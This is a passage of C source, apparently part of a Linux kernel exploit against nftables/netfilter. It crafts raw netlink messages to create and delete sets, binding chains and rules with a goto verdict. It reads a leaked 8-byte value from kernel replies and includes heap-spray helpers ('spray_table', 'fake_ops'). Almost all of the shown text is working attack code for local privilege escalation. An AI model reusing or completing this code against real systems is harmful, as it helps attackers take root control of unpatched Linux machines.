    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);

}


void create_rbtree_set(int sock){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();


    /*
    {
        "NFTA_SET_TABLE":"my_table",
        "NFTA_SET_NAME":"rbtree@@",
        "NFTA_SET_ID":0,
        "NFTA_SET_KEY_LEN":64,
        "NFTA_SET_FLAGS":137
        

    }


    */

    int pay1_size = 52;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,114,98,116,114,101,101,64,64,8,0,10,0,0,0,0,0,8,0,5,0,0,0,0,64,8,0,3,0,0,0,0,141};
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);

    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);
}



void del_set_elem(int sock){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();


    /*
    {
        "NFTA_SET_ELEM_LIST_TABLE":"my_table",
        "NFTA_SET_ELEM_LIST_SET":"my_set@@",
        "NFTA_SET_ELEM_LIST_ELEMENTS":{
            "NONAME":{
                "NFTA_SET_ELEM_KEY":{
                    "NFTA_DATA_VALUE":"aaaaaaaabbbbbbbb"
                }

            }
        }

    }


    */

    int pay1_size = 60;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_DELSETELEM;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,109,121,95,115,101,116,64,64,32,0,3,0,28,0,0,0,24,0,1,0,20,0,1,0,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);

    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);

}


size_t data[0x1000];
size_t fake_ops[0x100];


void create_set(int sock, const char *set_name, uint32_t set_keylen, uint32_t data_len, const char *table_name, uint32_t id) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_payload;
    struct nlmsghdr *nlh_batch_end;
    struct nfgenmsg *nfm;
    struct nlattr *attr;
    uint64_t nlh_payload_size;
    struct iovec iov[3];

    /* Prepare the netlink sockaddr for msg */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;

    /* First netlink message: batch_begin */
    nlh_batch_begin = get_batch_begin_nlmsg();

    /* Second netlink message : Set attributes */
    nlh_payload_size = sizeof(struct nfgenmsg);                                     // Mandatory
    nlh_payload_size += S8_NLA_SIZE;                                                // NFTA_SET_TABLE
    nlh_payload_size += S8_NLA_SIZE;                                                // NFTA_SET_NAME
    nlh_payload_size += U32_NLA_SIZE;                                               // NFTA_SET_ID
    nlh_payload_size += U32_NLA_SIZE;                                               // NFTA_SET_KEY_LEN
    nlh_payload_size += U32_NLA_SIZE;                                               // NFTA_SET_FLAGS
    nlh_payload_size += U32_NLA_SIZE;                                               // NFTA_SET_DATA_TYPE
    //nlh_payload_size += U32_NLA_SIZE;                                               // NFTA_SET_DATA_LEN
    nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

    /** Allocation **/
    nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
    if (!nlh_payload)
        do_error_exit("malloc");

    memset(nlh_payload, 0, nlh_payload_size);

    /** Fill the required fields **/
    nlh_payload->nlmsg_len = nlh_payload_size;
    nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;
    nlh_payload->nlmsg_pid = mypid;
    nlh_payload->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    nlh_payload->nlmsg_seq = 0;

    
    /** Setup the nfgenmsg **/
    nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
    nfm->nfgen_family = NFPROTO_INET;

    /** Setup the attributes */
    attr = (struct nlattr *)((void *)nlh_payload + NLMSG_SPACE(sizeof(struct nfgenmsg)));
    attr = set_str8_attr(attr, NFTA_SET_TABLE, table_name);
    attr = set_str8_attr(attr, NFTA_SET_NAME, set_name);
    attr = set_u32_attr(attr, NFTA_SET_ID, id);
    attr = set_u32_attr(attr, NFTA_SET_KEY_LEN, set_keylen);
    attr = set_u32_attr(attr, NFTA_SET_FLAGS, 1);
    //attr = set_u32_attr(attr, NFTA_SET_DATA_TYPE, 0);
    set_u32_attr(attr, NFTA_SET_DATA_LEN, data_len);

    /* Last netlink message: batch_end */
    nlh_batch_end = get_batch_end_nlmsg();

    /* Setup the iovec */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh_payload;
    iov[1].iov_len = nlh_payload->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

    /* Prepare the message to send */
    memset(&msg, 0, sizeof(struct msghdr));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    /* Send message */
    sendmsg(sock, &msg, 0);

    /* Free allocated memory */
    free(nlh_batch_end);
    free(nlh_payload);
    free(nlh_batch_begin);
}

void create_chain(int sock, const char *table_name, const char *chain_name) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();

    int nlh_payload_size = sizeof(struct nfgenmsg);
    nlh_payload_size += S8_NLA_SIZE;
    nlh_payload_size += S8_NLA_SIZE;

    nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

    /* Netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(nlh_payload_size);
    if (!nlh)
        do_error_exit("malloc");

    
    memset(nlh, 0, nlh_payload_size);
    nlh->nlmsg_len = nlh_payload_size;
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN;
    nlh->nlmsg_pid = mypid;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;

    nfm = NLMSG_DATA(nlh);
    nfm->nfgen_family = NFPROTO_INET;

    /** Prepare associated attribute **/
    attr = (void *)nlh + NLMSG_SPACE(sizeof(struct nfgenmsg));
    attr = set_str8_attr(attr, NFTA_CHAIN_TABLE, table_name);
    attr = set_str8_attr(attr, NFTA_CHAIN_NAME, chain_name);

    /* Netlink batch_end message preparation */
    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh;
    iov[1].iov_len = nlh->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh);
    free(nlh_batch_begin);
}

/*
enum nft_chain_flags {
	NFT_CHAIN_BASE		= (1 << 0),
	NFT_CHAIN_HW_OFFLOAD	= (1 << 1),
	NFT_CHAIN_BINDING	= (1 << 2),
};
#define NFT_CHAIN_FLAGS		(NFT_CHAIN_BASE		| \
				 NFT_CHAIN_HW_OFFLOAD	| \
				 NFT_CHAIN_BINDING)

*/

void create_binding_chain(int sock){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();



    /*
    {   
        "NFTA_CHAIN_TABLE":"my_table",
        "NFTA_CHAIN_NAME":"my_chain",
        "NFTA_CHAIN_FLAGS":4


    }


    */

    int pay1_size = 36;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN;;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,3,0,109,121,95,99,104,97,105,110,8,0,10,0,0,0,0,4};
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);

    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);

}

void delset(int sock){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();

    /*
    {   
        "NFTA_SET_TABLE":"my_table",
        "NFTA_SET_NAME":"my_set@@"

    }

    */

    int pay1_size = 28;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_DELSET;;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,109,121,95,115,101,116,64,64};
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);

    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);
    
}

void delchain(int sock, const char *name){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();

    /*
    {   
        "NFTA_CHAIN_TABLE":"my_table",
        "NFTA_CHAIN_NAME":"my_chain"
    }

    */

    int pay1_size = 28;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_DELCHAIN;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,3,0,109,121,95,99,104,97,105,110};
    if(name) memcpy(msgcon1+20, name, 8);
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);

    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);
    
}

void newrule(int sock){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();

    /*
    {   
        "NFTA_RULE_TABLE":"my_table",
        "NFTA_RULE_CHAIN":"chain001"
    }

    */

    int pay1_size = 28;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,99,104,97,105,110,48,48,49};
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);

    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);
    
}

void newrule_immediate(int sock){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();

    /*
        NFT_REG_VERDICT == 0
        pwndbg> p (unsigned int)NFT_GOTO
        $5 = 4294967292
    */
    /*
    {   
        "NFTA_RULE_TABLE":"my_table",
        "NFTA_RULE_CHAIN":"chain001",
        "NFTA_RULE_EXPRESSIONS":{
            "NFTA_LIST_ELEM":{
                "NFTA_EXPR_NAME":"immediate",
                "NFTA_EXPR_DATA":{
                    "NFTA_IMMEDIATE_DREG":0,
                    "NFTA_IMMEDIATE_DATA":{
                        "NFTA_DATA_VERDICT":{
                            "NFTA_VERDICT_CODE":4294967292,  
                            "NFTA_VERDICT_CHAIN":"my_chain"
                        }
                    }
                }
            }
        }
    }

    */

    int pay1_size = 92;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,99,104,97,105,110,48,48,49,64,0,4,128,60,0,1,128,13,0,1,0,105,109,109,101,100,105,97,116,101,0,0,0,40,0,2,128,8,0,1,0,0,0,0,0,28,0,2,128,24,0,2,128,8,0,1,0,255,255,255,252,12,0,2,0,109,121,95,99,104,97,105,110};
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);

    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);
    
}


void getrule(int sock){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov;
    struct nlmsghdr *nlh1;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /*
    {   
        "NFTA_RULE_TABLE":"my_table",
        "NFTA_RULE_CHAIN":"chain001",
        "NFTA_RULE_HANDLE":4
    }

    */

    /*
     * NOTE:
     * - NFT_MSG_GETRULE is registered as NFNL_CB_RCU (not NFNL_CB_BATCH),
     *   so it must NOT be sent inside an NFNL_MSG_BATCH_{BEGIN,END} batch.
     * - nfnetlink/netlink requires NLM_F_REQUEST, otherwise the kernel will
     *   ignore the message.
     * - NFTA_RULE_HANDLE is NLA_U64 (be64), so the attribute size must be 8.
     */

    int pay1_size = sizeof(struct nfgenmsg) + S8_NLA_SIZE + S8_NLA_SIZE + U64_NLA_SIZE;
    int nlh1_size = NLMSG_SPACE(pay1_size);

    nlh1 = (struct nlmsghdr *)malloc(nlh1_size);
    if (!nlh1)
        do_error_exit("malloc");

    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_GETRULE;
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh1->nlmsg_seq = 0;

    nfm = NLMSG_DATA(nlh1);
    nfm->nfgen_family = NFPROTO_INET;

    attr = (void *)nlh1 + NLMSG_SPACE(sizeof(struct nfgenmsg));
    attr = set_str8_attr(attr, NFTA_RULE_TABLE, "my_table");
    attr = set_str8_attr(attr, NFTA_RULE_CHAIN, "chain001");
    attr = set_u64_attr(attr, NFTA_RULE_HANDLE, 4);

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    iov.iov_base = (void *)nlh1;
    iov.iov_len = nlh1->nlmsg_len;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    sendmsg(sock, &msg, 0);
    /*
     * recvmsg() signature is:
     *   ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags);
     *
     * Passing a raw buffer (like the global `data[]`) as the 2nd argument
     * makes the kernel interpret it as a (zeroed) msghdr with iovlen == 0,
     * which results in an immediate 0-byte receive.
     */


    char rbuf[NETLINK_RECEIVE_BUFFER_SIZE];
    struct sockaddr_nl src_snl;
    struct iovec riov;
    struct msghdr rmsg;
    ssize_t ret;

    memset(&src_snl, 0, sizeof(src_snl));
    memset(&rmsg, 0, sizeof(rmsg));
    memset(rbuf, 0, sizeof(rbuf));

    riov.iov_base = rbuf;
    riov.iov_len = sizeof(rbuf);

    rmsg.msg_name = (void *)&src_snl;
    rmsg.msg_namelen = sizeof(src_snl);
    rmsg.msg_iov = &riov;
    rmsg.msg_iovlen = 1;

    /*
     * Read until we observe an ACK/error (NLMSG_ERROR). On success you
     * usually get: reply (NFNL_SUBSYS_NFTABLES/NFT_MSG_NEWRULE) then ACK.
     * On failure you may only get the NLMSG_ERROR.
     */
    int got_ack = 0;
    for (int i = 0; i < 8 && !got_ack; i++) {
        ret = recvmsg(sock, &rmsg, 0);
        if (ret < 0)
            do_error_exit("recvmsg");
        if (ret == 0) {
            puts("recv : 0 bytes (peer closed?)");
            break;
        }

        printf("recv : %zd bytes\n", ret);
        char *r = &rmsg;
        char *p = memmem(&rmsg, 0x200, "my_chain", 8);
        printf("p : %p, r : %p, off=%d\n", p, r, p-r);
        write(1, r+216, 0x8);
        size_t val;
        memcpy(&val, r+216, 8);
        printf("val : %llx\n", val);
        

        
        //break;

        int rlen = (int)ret;
        for (struct nlmsghdr *rnlh = (struct nlmsghdr *)rbuf;
             NLMSG_OK(rnlh, rlen);
             rnlh = NLMSG_NEXT(rnlh, rlen)) {
            if (rnlh->nlmsg_type == NLMSG_ERROR) {
                struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(rnlh);
                printf("netlink ack: err=%d\n", err->error);
                got_ack = 1;
            } else {
                printf("netlink msg: type=0x%x len=%u\n",
                       rnlh->nlmsg_type, rnlh->nlmsg_len);
                
            }
        }

        memset(rbuf, 0, sizeof(rbuf));
    }

    /* Free used structures */
    free(nlh1);
    
}

void spray_table(int sock, char *pay){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    int paylen = strlen(pay);

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();

    /*
    {   
        "NFTA_TABLE_NAME":"AAAAAAAAAAAAAAAA"
    }

    */

    int pay1_size = 8+paylen;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
